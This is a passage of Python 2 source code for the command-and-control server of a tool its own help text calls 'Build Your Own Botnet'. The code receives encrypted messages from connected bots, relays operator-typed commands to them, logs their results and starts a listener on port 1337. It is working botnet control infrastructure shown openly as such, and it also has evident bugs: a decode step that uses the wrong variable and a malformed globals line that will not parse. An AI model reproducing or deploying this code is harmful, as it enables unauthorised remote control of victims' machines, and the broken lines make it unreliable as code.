            header_size = struct.calcsize("L")
            header      = self._socket.recv(header_size)
            msg_size    = struct.unpack(">L", header)[0]
            msg         = ""
            while len(msg) < msg_size:
                msg += self._socket.recv(1)
            if msg:
                info = security.decrypt_aes(msg, self.key)
                if info:
                    info = json.loads(data)
                    info2 = globals()['_threads']['server'].database.handle_client(info)
                    if isinstance(info2, dict):
                        info = info2
                        globals()['_threads']['server'].task_send(json.dumps(info), client_id=self.name)
                return info
        except Exception as e:
            self._error(str(e))


    def prompt(self, data):
        with globals()['_threads']['server']._lock:
            return raw_input(globals()['_threads']['server']._prompt_color + globals()['_threads']['server']._prompt_style + '\n' + bytes(data).rstrip())


    def status(self):
        try:
            c = time.time() - float(self._created)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            return "{} error: {}".format(self.status.func_name, str(e))


    def run(self):
        while True:
            try:
                if self._active.wait():
                    task = globals()['_threads']['server'].task_recv(client=self.name) if not self._prompt else self._prompt

                    if 'help' in task.get('command'):
                        self._active.clear()
                        globals()['_threads']['server'].help(task.get('result'))
                        self._active.set()

                    elif 'prompt' in task.get('command'):
                        self._prompt = task
                        command = self.prompt(task.get('result') % int(self.name))
                        cmd, _, action  = command.partition(' ')
                        
                        if cmd in ('\n', ' ', ''):
                            continue

                        elif cmd in globals()['_threads']['server'].commands and cmd != 'help':
                            result = globals()['_threads']['server'].commands[cmd](action) if len(action) else globals()['_threads']['server'].commands[cmd]()
                            if result:
                                globals()['_threads']['server'].display(result)
                                globals()['_threads']['server'].database.handle_task(task)
                            continue

                        else:
                            globals()['_threads']['server'].task_send(command, client_id=self.name)
                            
                    else:
                        if task.get('result') and task.get('result') != 'None':
                            globals()['_threads']['server'].display(task.get('result'))
                            globals()['_threads']['server'].database.handle_task(task)

                    if globals()['_abort']:
                        break
                    
                    self._prompt = None
                    
            except Exception as e:
                self._error(str(e))
                time.sleep(1)
                break
            
        globals()['_threads']['server']._return()



def main():
    parser = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.1.2')
    parser.add_argument('-p', '--port', action='store', type=int, default=1337, help='port number for incoming client connections')
    parser.add_argument('-c', '--config',  action='store', type=str, default='../config.ini', help='configuration file path')
    parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
    try:
        options = parser.parse_args()
        globals()['globals()['_debug']'] = options.debug
        globals()['_threads']['server'] = Server(port=options.port, config=options.config)
        globals()['_threads'].start()
    except Exception as e:
        print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
        parser.print_help()
        sys.exit(0)


if __name__ == '__main__':
    main()
